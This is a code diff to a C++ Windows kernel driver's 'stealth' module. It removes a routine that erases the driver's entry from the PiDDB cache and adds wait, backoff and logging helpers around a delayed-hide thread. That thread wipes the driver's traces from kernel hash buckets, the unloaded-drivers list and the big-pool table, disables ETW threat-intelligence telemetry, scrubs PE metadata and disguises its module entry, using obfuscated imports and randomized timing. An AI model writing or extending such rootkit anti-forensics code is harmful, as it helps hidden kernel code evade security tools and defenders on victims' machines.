@@ -4,6 +4,7 @@
 #include <ntimage.h>
 #include "../imports/Defs.h"
 #include "../imports/Strings.h"
+#include "CoreSecurity.h"
 
 namespace stealth {
     inline BOOLEAN (NTAPI* _ExAcquireResourceExclusiveLite)(PVOID Resource, BOOLEAN Wait) = nullptr;
@@ -11,14 +12,129 @@ namespace stealth {
     inline VOID    (NTAPI* _ExReleaseResourceLite)(PVOID Resource) = nullptr;
     inline VOID    (NTAPI* _KeEnterCriticalRegion)() = nullptr;
     inline VOID    (NTAPI* _KeLeaveCriticalRegion)() = nullptr;
-    inline PVOID   (NTAPI* _RtlLookupElementGenericTableAvl)(PVOID Table, PVOID Buffer) = nullptr;
-    inline BOOLEAN (NTAPI* _RtlDeleteElementGenericTableAvl)(PVOID Table, PVOID Buffer) = nullptr;
     inline PVOID   (NTAPI* _ExAllocatePoolWithTag)(ULONG PoolType, SIZE_T NumberOfBytes, ULONG Tag) = nullptr;
     inline VOID    (NTAPI* _ExFreePoolWithTag)(PVOID P, ULONG Tag) = nullptr;
     inline PVOID   g_PsLoadedModuleResource = nullptr;
 
     inline volatile ULONG g_NtBuildNumber = 0;
     inline volatile LONG g_VersionResolved = 0;
+
+    __forceinline ULONG elapsed_us(const LARGE_INTEGER& start, const LARGE_INTEGER& freq) {
+        LARGE_INTEGER now = KeQueryPerformanceCounter(nullptr);
+        if (freq.QuadPart <= 0 || now.QuadPart < start.QuadPart)
+            return 0;
+        return static_cast<ULONG>(((now.QuadPart - start.QuadPart) * 1000000ULL) / static_cast<ULONGLONG>(freq.QuadPart));
+    }
+
+    __forceinline void passive_backoff_100ns(LONG64 relative_interval) {
+        if (_KeDelayExecutionThread && KeGetCurrentIrql() == PASSIVE_LEVEL) {
+            LARGE_INTEGER wait;
+            wait.QuadPart = relative_interval;
+            _KeDelayExecutionThread(KernelMode, FALSE, &wait);
+        } else {
+            YieldProcessor();
+        }
+    }
+
+    __forceinline BOOLEAN wait_for_state(volatile LONG* state, LONG ready_value, const char* label) {
+        for (ULONG wait = 0; wait < 400; ++wait) {
+            LONG current = _InterlockedCompareExchange(state, ready_value, ready_value);
+            if (current == ready_value)
+                return TRUE;
+            if (wait < 4 || wait == 8 || wait == 16 || wait == 32 || (wait % 64) == 0) {
+                WW_LOG("stealth::state_wait label=%s wait=%lu current=%ld ready=%ld",
+                    label ? label : "unknown",
+                    wait,
+                    current,
+                    ready_value);
+            }
+            passive_backoff_100ns(-10000LL);
+        }
+        WW_LOG("stealth::state_wait_timeout label=%s current=%ld ready=%ld",
+            label ? label : "unknown",
+            _InterlockedCompareExchange(state, ready_value, ready_value),
+            ready_value);
+        return FALSE;
+    }
+
+    __forceinline UINT64 handle_to_u64(HANDLE value) {
+        return static_cast<UINT64>(reinterpret_cast<ULONG_PTR>(value));
+    }
+
+    __forceinline HANDLE registered_client_pid_snapshot() {
+        return reinterpret_cast<HANDLE>(
+            _InterlockedCompareExchange64(
+                reinterpret_cast<volatile LONG64*>(&caller_validation::g_registered_client_pid),
+                0,
+                0));
+    }
+
+    __forceinline BOOLEAN registered_client_is_live(HANDLE pid, NTSTATUS* lookup_status) {
+        if (lookup_status)
+            *lookup_status = STATUS_INVALID_PARAMETER;
+        if (!pid)
+            return FALSE;
+
+        LONG validation = _InterlockedCompareExchange(&caller_validation::g_validation_enabled, 0, 0);
+        if (validation == 0)
+            return FALSE;
+
+        if (!_PsLookupProcessByProcessId || !_ObfDereferenceObject) {
+            if (lookup_status)
+                *lookup_status = STATUS_SUCCESS;
+            return TRUE;
+        }
+
+        PEPROCESS process = nullptr;
+        NTSTATUS status = _PsLookupProcessByProcessId(pid, &process);
+        if (lookup_status)
+            *lookup_status = status;
+        if (NT_SUCCESS(status) && process) {
+            _ObfDereferenceObject(process);
+            return TRUE;
+        }
+        return FALSE;
+    }
+
+    __forceinline BOOLEAN wait_for_registered_client(const char* phase) {
+        for (ULONG poll = 0; poll < 80; ++poll) {
+            HANDLE pid = registered_client_pid_snapshot();
+            NTSTATUS lookup_status = STATUS_UNSUCCESSFUL;
+            BOOLEAN live = registered_client_is_live(pid, &lookup_status);
+            LONG validation = _InterlockedCompareExchange(&caller_validation::g_validation_enabled, 0, 0);
+
+            if (live) {
+                WW_LOG("stealth_delayed_hide::session phase=%s poll=%lu live=1 pid=%llu validation=%ld lookup=0x%08lx",
+                    phase ? phase : "unknown",
+                    poll,
+                    handle_to_u64(pid),
+                    validation,
+                    lookup_status);
+                return TRUE;
+            }
+
+            if (poll < 4 || poll == 8 || poll == 16 || poll == 32 || (poll % 16) == 0) {
+                WW_LOG("stealth_delayed_hide::backoff phase=%s poll=%lu live=0 pid=%llu validation=%ld lookup=0x%08lx",
+                    phase ? phase : "unknown",
+                    poll,
+                    handle_to_u64(pid),
+                    validation,
+                    lookup_status);
+            }
+
+            if (!_KeDelayExecutionThread)
+                break;
+            passive_backoff_100ns(-2500000LL);
+        }
+
+        HANDLE final_pid = registered_client_pid_snapshot();
+        LONG final_validation = _InterlockedCompareExchange(&caller_validation::g_validation_enabled, 0, 0);
+        WW_LOG("stealth_delayed_hide::no_live_client phase=%s pid=%llu validation=%ld",
+            phase ? phase : "unknown",
+            handle_to_u64(final_pid),
+            final_validation);
+        return FALSE;
+    }
 
     __forceinline ULONG GetNtBuildNumber() {
         LONG state = _InterlockedCompareExchange(&g_VersionResolved, 0, 0);
@@ -29,9 +145,7 @@ namespace stealth {
         LONG prev = _InterlockedCompareExchange(&g_VersionResolved, 1, 0);
         if (prev == 2) return g_NtBuildNumber;
         if (prev == 1) {
-            while (_InterlockedCompareExchange(&g_VersionResolved, 2, 2) != 2) {
-                YieldProcessor();
-            }
+            wait_for_state(&g_VersionResolved, 2, "nt_build");
             return g_NtBuildNumber;
         }
 
@@ -77,34 +191,14 @@ namespace stealth {
         *(PVOID*)&_ExReleaseResourceLite          = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExReleaseResourceLite"));
         *(PVOID*)&_KeEnterCriticalRegion          = GetProcAddress(kernelBase, (PCHAR)skCrypt("KeEnterCriticalRegion"));
         *(PVOID*)&_KeLeaveCriticalRegion          = GetProcAddress(kernelBase, (PCHAR)skCrypt("KeLeaveCriticalRegion"));
-        *(PVOID*)&_RtlLookupElementGenericTableAvl = GetProcAddress(kernelBase, (PCHAR)skCrypt("RtlLookupElementGenericTableAvl"));
-        *(PVOID*)&_RtlDeleteElementGenericTableAvl = GetProcAddress(kernelBase, (PCHAR)skCrypt("RtlDeleteElementGenericTableAvl"));
         *(PVOID*)&_ExAllocatePoolWithTag = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExAllocatePoolWithTag"));
         *(PVOID*)&_ExFreePoolWithTag = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExFreePoolWithTag"));
 
         g_PsLoadedModuleResource = GetProcAddress(kernelBase, (PCHAR)skCrypt("PsLoadedModuleResource"));
 
         return (_ExAcquireResourceExclusiveLite && _ExAcquireResourceSharedLite &&
-                _ExReleaseResourceLite && _KeEnterCriticalRegion && _KeLeaveCriticalRegion &&
-                _RtlLookupElementGenericTableAvl && _RtlDeleteElementGenericTableAvl);
+                _ExReleaseResourceLite && _KeEnterCriticalRegion && _KeLeaveCriticalRegion);
     }
-
-    typedef struct _PIDDB_CACHE_ENTRY {
-        LIST_ENTRY     List;
-        UNICODE_STRING DriverName;
-        ULONG          TimeDateStamp;
-        NTSTATUS       LoadStatus;
-        char           _pad0[16];
-    } PIDDB_CACHE_ENTRY, * PPIDDB_CACHE_ENTRY;
-
-    typedef struct _PIDDB_CACHE_ENTRY_WIN11 {
-        LIST_ENTRY     List;
-        UNICODE_STRING DriverName;
-        ULONG          TimeDateStamp;
-        NTSTATUS       LoadStatus;
-        ULONG64        DriverHash;
-        char           _pad0[8];
-    } PIDDB_CACHE_ENTRY_WIN11, * PPIDDB_CACHE_ENTRY_WIN11;
 
     typedef struct _MM_UNLOADED_DRIVER {
         UNICODE_STRING Name;
@@ -553,9 +647,7 @@ namespace stealth {
             return (g_PoolBigPageTable != nullptr);
         }
         if (prev == 1) {
-            while (_InterlockedCompareExchange(&g_BigPoolResolved, 2, 2) != 2) {
-                YieldProcessor();
-            }
+            wait_for_state(&g_BigPoolResolved, 2, "big_pool");
             return (g_PoolBigPageTable != nullptr);
         }
 
@@ -664,300 +756,6 @@ namespace stealth {
             __except (EXCEPTION_EXECUTE_HANDLER) {
                 continue;
             }
-        }
-
-        return cleaned;
-    }
-
-    __forceinline bool ValidateAvlTable(PVOID pTable, PVOID textBase, SIZE_T textSize) {
-        if (!pTable || !_MmIsAddressValid(pTable))
-            return false;
-
-        __try {
-            ULONG64 ntTextStart = (ULONG64)textBase;
-            ULONG64 ntTextEnd = ntTextStart + textSize;
-
-            ULONG64 compAddr = *(ULONG64*)((UCHAR*)pTable + 0x48);
-            if (compAddr < 0xFFFF800000000000ULL)
-                return false;
-            if (!_MmIsAddressValid((PVOID)compAddr))
-                return false;
-            if (compAddr < ntTextStart || compAddr >= ntTextEnd)
-                return false;
-
-            ULONG64 allocAddr = *(ULONG64*)((UCHAR*)pTable + 0x50);
-            if (allocAddr < 0xFFFF800000000000ULL)
-                return false;
-            if (!_MmIsAddressValid((PVOID)allocAddr))
-                return false;
-
-            ULONG64 freeAddr = *(ULONG64*)((UCHAR*)pTable + 0x58);
-            if (freeAddr < 0xFFFF800000000000ULL)
-                return false;
-            if (!_MmIsAddressValid((PVOID)freeAddr))
-                return false;
-
-            ULONG numElements = *(ULONG*)((UCHAR*)pTable + 0x2C);
-            if (numElements == 0 || numElements > 100000)
-                return false;
-
-        } __except (EXCEPTION_EXECUTE_HANDLER) {
-            return false;
-        }
-
-        return true;
-    }
-
-
-    inline PVOID FindPatternFrom(PVOID base, SIZE_T size, SIZE_T startOffset, const UCHAR* pattern, const char* mask) {
-        SIZE_T maskLen = 0;
-        while (mask[maskLen]) maskLen++;
-
-        if (!base || !pattern || startOffset >= size || (size - startOffset) < maskLen)
-            return nullptr;
-
-        const UCHAR* data = static_cast<const UCHAR*>(base);
-        constexpr SIZE_T pageSize = 0x1000;
-
-        for (SIZE_T i = startOffset; i <= size - maskLen; ) {
-
-            ULONG_PTR currentAddr = reinterpret_cast<ULONG_PTR>(data + i);
-            ULONG_PTR currentPage = currentAddr & ~(pageSize - 1);
-
-            if (!_MmIsAddressValid(reinterpret_cast<PVOID>(currentPage))) {
-
-                ULONG_PTR nextPage = currentPage + pageSize;
-                SIZE_T skip = nextPage - currentAddr;
-                i += skip;
-                continue;
-            }
-
-
-            ULONG_PTR pageEnd = currentPage + pageSize;
-            SIZE_T maxIndexThisPage = pageEnd - reinterpret_cast<ULONG_PTR>(data);
-            if (maxIndexThisPage > size) maxIndexThisPage = size;
-
-
-            for (; i <= maxIndexThisPage - maskLen && i <= size - maskLen; ++i) {
-
-                ULONG_PTR patternEndAddr = reinterpret_cast<ULONG_PTR>(data + i + maskLen - 1);
-                ULONG_PTR patternEndPage = patternEndAddr & ~(pageSize - 1);
-                if (patternEndPage != currentPage && !_MmIsAddressValid(reinterpret_cast<PVOID>(patternEndPage))) {
-
-                    i = patternEndPage - reinterpret_cast<ULONG_PTR>(data);
-                    break;
-                }
-
-                bool hit = true;
-                for (SIZE_T j = 0; j < maskLen; ++j) {
-                    if (mask[j] == 'x' && data[i + j] != pattern[j]) {
-                        hit = false;
-                        break;
-                    }
-                }
-                if (hit)
-                    return const_cast<UCHAR*>(&data[i]);
-            }
-        }
-        return nullptr;
-    }
-
-    inline bool CleanPiDDBCacheTable(PVOID ntBase, PLDR_DATA_TABLE_ENTRY drvEntry) {
-        if (!ntBase || !drvEntry || !drvEntry->DllBase)
-            return false;
-
-        auto dos = static_cast<PIMAGE_DOS_HEADER>(drvEntry->DllBase);
-        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
-            return false;
-
-        auto ntHdr = reinterpret_cast<PIMAGE_NT_HEADERS64>((UCHAR*)drvEntry->DllBase + dos->e_lfanew);
-        if (ntHdr->Signature != IMAGE_NT_SIGNATURE)
-            return false;
-
-        ULONG timeDateStamp = ntHdr->FileHeader.TimeDateStamp;
-
-        PVOID secBases[16];
-        SIZE_T secSizes[16];
-        ULONG secCount = GetExecutableSections(ntBase, secBases, secSizes, 16);
-        if (secCount == 0)
-            return false;
-
-        if (!_RtlLookupElementGenericTableAvl || !_RtlDeleteElementGenericTableAvl)
-            return false;
-
-        static const UCHAR patA[] = {
-            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
-            0xE8, 0x00, 0x00, 0x00, 0x00,
-            0x3D, 0x34, 0x00, 0x00, 0xC0
-        };
-
-        static const UCHAR patB[] = {
-            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
-            0xE8, 0x00, 0x00, 0x00, 0x00,
-            0x3D, 0x22, 0x00, 0x00, 0xC0
-        };
-
-        static const UCHAR patC[] = { 0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D };
-
-        static const UCHAR patD[] = {
-            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
-            0xE8, 0x00, 0x00, 0x00, 0x00,
-            0x48, 0x85, 0xC0
-        };
-
-        static const UCHAR patE[] = {
-            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
-            0x45, 0x33, 0xC0
-        };
-
-        static const UCHAR patF[] = {
-            0x48, 0x8B, 0x55, 0x00, 0x48, 0x8D, 0x0D
-        };
-
-        struct PatDesc {
-            const UCHAR* bytes;
-            const char* mask;
-            int leaOff;
-        };
-
-        PatDesc pats[] = {
-            { patA, "xxx????x????xxxxx", 0 },
-            { patB, "xxx????x????xxxxx", 0 },
-            { patD, "xxx????x????xxx",   0 },
-            { patC, "xxxxxx",            3 },
-            { patE, "xxx????xxx",        0 },
-            { patF, "xxx?xxx",           4 },
-        };
-        constexpr int NUM_PATS = 6;
-
-        PVOID pTable = nullptr;
-        PVOID leaInsn = nullptr;
-
-        for (int p = 0; p < NUM_PATS && !pTable; p++) {
-            for (ULONG sec = 0; sec < secCount && !pTable; sec++) {
-                SIZE_T searchOff = 0;
-
-                for (;;) {
-                    PVOID found = FindPatternFrom(secBases[sec], secSizes[sec], searchOff, pats[p].bytes, pats[p].mask);
-                    if (!found)
-                        break;
-
-                    PVOID lea = (UCHAR*)found + pats[p].leaOff;
-                    PVOID candidateTable = ResolveRelative(lea, 3, 7);
-
-                    if (candidateTable && _MmIsAddressValid(candidateTable) &&
-                        ValidateAvlTable(candidateTable, secBases[sec], secSizes[sec])) {
-                        pTable = candidateTable;
-                        leaInsn = lea;
-                        break;
-                    }
-
-                    SIZE_T consumed = ((UCHAR*)found - (UCHAR*)secBases[sec]) + 1;
-                    if (consumed >= secSizes[sec])
-                        break;
-                    searchOff = consumed;
-                }
-            }
-        }
-
-        if (!pTable)
-            return false;
-        PVOID pLock = nullptr;
-
-        for (int off = 0x10; off < 0xC0; off++) {
-            UCHAR* scan = (UCHAR*)leaInsn - off;
-            if (!_MmIsAddressValid(scan))
-                break;
-
-            __try {
-                if (scan[0] == 0x48 && scan[1] == 0x8D &&
-                    (scan[2] == 0x0D || scan[2] == 0x15)) {
-
-                    PVOID cand = ResolveRelative(scan, 3, 7);
-                    if (cand && _MmIsAddressValid(cand) && cand != pTable) {
-                        pLock = cand;
-                        break;
-                    }
-                }
-            } __except (EXCEPTION_EXECUTE_HANDLER) {
-                continue;
-            }
-        }
-
-        if (!pLock) {
-            for (int off = 7; off < 0xC0; off++) {
-                UCHAR* scan = (UCHAR*)leaInsn + off;
-                if (!_MmIsAddressValid(scan))
-                    break;
-
-                __try {
-                    if (scan[0] == 0x48 && scan[1] == 0x8D &&
-                        (scan[2] == 0x0D || scan[2] == 0x15)) {
-
-                        PVOID cand = ResolveRelative(scan, 3, 7);
-                        if (cand && _MmIsAddressValid(cand) && cand != pTable) {
-                            pLock = cand;
-                            break;
-                        }
-                    }
-                } __except (EXCEPTION_EXECUTE_HANDLER) {
-                    continue;
-                }
-            }
-        }
-
-        if (pLock) {
-            _KeEnterCriticalRegion();
-            _ExAcquireResourceExclusiveLite(pLock, TRUE);
-        }
-
-        bool cleaned = false;
-
-        __try {
-            if (IsWindows11_24H2OrNewer()) {
-                PIDDB_CACHE_ENTRY_WIN11 lookupKey11 = {};
-                lookupKey11.DriverName = drvEntry->BaseDllName;
-                lookupKey11.TimeDateStamp = timeDateStamp;
-                lookupKey11.LoadStatus = STATUS_SUCCESS;
-                lookupKey11.DriverHash = 0;
-
-                auto entry11 = static_cast<PPIDDB_CACHE_ENTRY_WIN11>(
-                    _RtlLookupElementGenericTableAvl(pTable, &lookupKey11)
-                );
-
-                if (entry11 && _MmIsAddressValid(entry11) &&
-                    _MmIsAddressValid(&entry11->List) &&
-                    entry11->List.Flink && _MmIsAddressValid(entry11->List.Flink) &&
-                    entry11->List.Blink && _MmIsAddressValid(entry11->List.Blink)) {
-                    RemoveEntryList(&entry11->List);
-                    _RtlDeleteElementGenericTableAvl(pTable, &lookupKey11);
-                    cleaned = true;
-                }
-            } else {
-                PIDDB_CACHE_ENTRY lookupKey = {};
-                lookupKey.DriverName = drvEntry->BaseDllName;
-                lookupKey.TimeDateStamp = timeDateStamp;
-
-                auto entry = static_cast<PPIDDB_CACHE_ENTRY>(
-                    _RtlLookupElementGenericTableAvl(pTable, &lookupKey)
-                );
-
-                if (entry && _MmIsAddressValid(entry) &&
-                    _MmIsAddressValid(&entry->List) &&
-                    entry->List.Flink && _MmIsAddressValid(entry->List.Flink) &&
-                    entry->List.Blink && _MmIsAddressValid(entry->List.Blink)) {
-                    RemoveEntryList(&entry->List);
-                    _RtlDeleteElementGenericTableAvl(pTable, &lookupKey);
-                    cleaned = true;
-                }
-            }
-        } __except (EXCEPTION_EXECUTE_HANDLER) {
-            cleaned = false;
-        }
-
-        if (pLock) {
-            _ExReleaseResourceLite(pLock);
-            _KeLeaveCriticalRegion();
         }
 
         return cleaned;
@@ -1207,14 +1005,10 @@ namespace stealth {
         if (!DriverObject || !DriverObject->DriverSection)
             return;
 
-        bool stealthReady = SetupStealthFunctions();
+        SetupStealthFunctions();
 
         PVOID ntBase  = (PVOID)get_nt_base();
         auto ldrEntry = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
-
-        if (stealthReady && ntBase && ldrEntry->DllBase) {
-            CleanPiDDBCacheTable(ntBase, ldrEntry);
-        }
 
         if (ntBase && ldrEntry->BaseDllName.Buffer) {
             CleanKernelHashBucketList(ntBase, &ldrEntry->BaseDllName);
@@ -1243,75 +1037,144 @@ namespace stealth {
     };
 
     inline DELAYED_HIDE_CONTEXT g_DelayedHideContext = { nullptr, 0 };
+    inline volatile LONG g_DelayedHideThreadActive = 0;
 
     inline VOID NTAPI DelayedHideThreadRoutine(PVOID StartContext) {
         UNREFERENCED_PARAMETER(StartContext);
+
+        LARGE_INTEGER freq;
+        LARGE_INTEGER thread_start = KeQueryPerformanceCounter(&freq);
+        _InterlockedExchange(&g_DelayedHideThreadActive, 1);
 
         UINT64 tsc = __rdtsc();
         ULONG delay_variation = (ULONG)((tsc >> 8) & 0x1F);
         LONG64 base_delay = -30000000LL;
         LONG64 extra_delay = -(LONG64)(delay_variation * 625000LL);
 
+        WW_LOG("stealth_delayed_hide::entry routine=%p pid=%llu tid=%llu ctx=%p driver=%p ready=%ld delay_100ns=%lld variation=%lu",
+            reinterpret_cast<PVOID>(&DelayedHideThreadRoutine),
+            handle_to_u64(PsGetCurrentProcessId()),
+            handle_to_u64(PsGetCurrentThreadId()),
+            StartContext,
+            g_DelayedHideContext.DriverObject,
+            _InterlockedCompareExchange(&g_DelayedHideContext.ReadyToHide, 0, 0),
+            base_delay + extra_delay,
+            delay_variation);
+
         LARGE_INTEGER delay;
         delay.QuadPart = base_delay + extra_delay;
 
         if (_KeDelayExecutionThread) {
-            _KeDelayExecutionThread(KernelMode, FALSE, &delay);
+            NTSTATUS delay_status = _KeDelayExecutionThread(KernelMode, FALSE, &delay);
+            WW_LOG("stealth_delayed_hide::initial_delay status=0x%08lx elapsed_us=%lu",
+                delay_status,
+                elapsed_us(thread_start, freq));
+        } else {
+            WW_LOG("stealth_delayed_hide::initial_delay skipped missing KeDelayExecutionThread");
         }
 
+        BOOLEAN live_client = wait_for_registered_client("before_cleanup");
         PDRIVER_OBJECT drvObj = g_DelayedHideContext.DriverObject;
 
-        if (drvObj && _MmIsAddressValid(drvObj) &&
+        if (live_client && drvObj && _MmIsAddressValid(drvObj) &&
             drvObj->DriverSection && _MmIsAddressValid(drvObj->DriverSection)) {
+            LARGE_INTEGER step_start = KeQueryPerformanceCounter(nullptr);
             bool stealthReady = SetupStealthFunctions();
+            WW_LOG("stealth_delayed_hide::step name=setup result=%u elapsed_us=%lu",
+                stealthReady ? 1u : 0u,
+                elapsed_us(step_start, freq));
+
             PVOID ntBase = (PVOID)get_nt_base();
             auto ldrEntry = static_cast<PLDR_DATA_TABLE_ENTRY>(drvObj->DriverSection);
 
             ULONG order = (ULONG)((__rdtsc() >> 4) % 6);
 
-            if (stealthReady && ntBase && ldrEntry && ldrEntry->DllBase) {
-                CleanPiDDBCacheTable(ntBase, ldrEntry);
-            }
+            WW_LOG("stealth_delayed_hide::cleanup_begin driver=%p section=%p nt_base=%p ldr=%p dll_base=%p size=0x%lx order=%lu",
+                drvObj,
+                drvObj->DriverSection,
+                ntBase,
+                ldrEntry,
+                ldrEntry ? ldrEntry->DllBase : nullptr,
+                ldrEntry ? ldrEntry->SizeOfImage : 0,
+                order);
 
             volatile ULONG spin = 8 + (order & 0x7);
             while (spin--) YieldProcessor();
 
             if (ntBase && ldrEntry && ldrEntry->BaseDllName.Buffer) {
-                CleanKernelHashBucketList(ntBase, &ldrEntry->BaseDllName);
+                step_start = KeQueryPerformanceCounter(nullptr);
+                bool hash_clean = CleanKernelHashBucketList(ntBase, &ldrEntry->BaseDllName);
+                WW_LOG("stealth_delayed_hide::step name=hash_bucket result=%u elapsed_us=%lu",
+                    hash_clean ? 1u : 0u,
+                    elapsed_us(step_start, freq));
             }
 
             spin = 4 + (order & 0x3);
             while (spin--) YieldProcessor();
 
             if (ntBase) {
-                CleanMmUnloadedDrivers(ntBase);
+                step_start = KeQueryPerformanceCounter(nullptr);
+                bool unloaded = CleanMmUnloadedDrivers(ntBase);
+                WW_LOG("stealth_delayed_hide::step name=mm_unloaded result=%u elapsed_us=%lu",
+                    unloaded ? 1u : 0u,
+                    elapsed_us(step_start, freq));
             }
 
             spin = 6 + (order & 0x5);
             while (spin--) YieldProcessor();
 
             if (ntBase && ldrEntry && ldrEntry->DllBase && ldrEntry->SizeOfImage) {
-                CleanBigPoolTable(ntBase, ldrEntry->DllBase, ldrEntry->SizeOfImage);
+                step_start = KeQueryPerformanceCounter(nullptr);
+                bool big_pool = CleanBigPoolTable(ntBase, ldrEntry->DllBase, ldrEntry->SizeOfImage);
+                WW_LOG("stealth_delayed_hide::step name=big_pool result=%u elapsed_us=%lu",
+                    big_pool ? 1u : 0u,
+                    elapsed_us(step_start, freq));
             }
 
             if (ntBase) {
-                DisableEtwThreatIntel(ntBase);
+                step_start = KeQueryPerformanceCounter(nullptr);
+                bool etw = DisableEtwThreatIntel(ntBase);
+                WW_LOG("stealth_delayed_hide::step name=etw_threat_intel result=%u elapsed_us=%lu",
+                    etw ? 1u : 0u,
+                    elapsed_us(step_start, freq));
             }
 
             if (ldrEntry) {
-                ScrubPEMetadata(drvObj);
-                DisguiseModuleEntry(drvObj);
+                step_start = KeQueryPerformanceCounter(nullptr);
+                bool scrub = ScrubPEMetadata(drvObj);
+                WW_LOG("stealth_delayed_hide::step name=scrub_pe result=%u elapsed_us=%lu",
+                    scrub ? 1u : 0u,
+                    elapsed_us(step_start, freq));
+
+                step_start = KeQueryPerformanceCounter(nullptr);
+                bool disguise = DisguiseModuleEntry(drvObj);
+                WW_LOG("stealth_delayed_hide::step name=disguise_module result=%u elapsed_us=%lu",
+                    disguise ? 1u : 0u,
+                    elapsed_us(step_start, freq));
             }
+        } else if (live_client) {
+            WW_LOG("stealth_delayed_hide::invalid_driver driver=%p valid=%u section=%p",
+                drvObj,
+                drvObj && _MmIsAddressValid(drvObj) ? 1u : 0u,
+                drvObj ? drvObj->DriverSection : nullptr);
         }
 
         g_DelayedHideContext.DriverObject = nullptr;
         _InterlockedExchange(&g_DelayedHideContext.ReadyToHide, 0);
+        _InterlockedExchange(&g_DelayedHideThreadActive, 0);
 
         if (_KeDelayExecutionThread) {
             LARGE_INTEGER shortDelay;
             shortDelay.QuadPart = -100000LL;
             _KeDelayExecutionThread(KernelMode, FALSE, &shortDelay);
         }
+
+        WW_LOG("stealth_delayed_hide::exit elapsed_us=%lu ready=%ld active=%ld pid=%llu validation=%ld",
+            elapsed_us(thread_start, freq),
+            _InterlockedCompareExchange(&g_DelayedHideContext.ReadyToHide, 0, 0),
+            _InterlockedCompareExchange(&g_DelayedHideThreadActive, 0, 0),
+            handle_to_u64(registered_client_pid_snapshot()),
+            _InterlockedCompareExchange(&caller_validation::g_validation_enabled, 0, 0));
 
         if (_PsTerminateSystemThread) {
             _PsTerminateSystemThread(STATUS_SUCCESS);
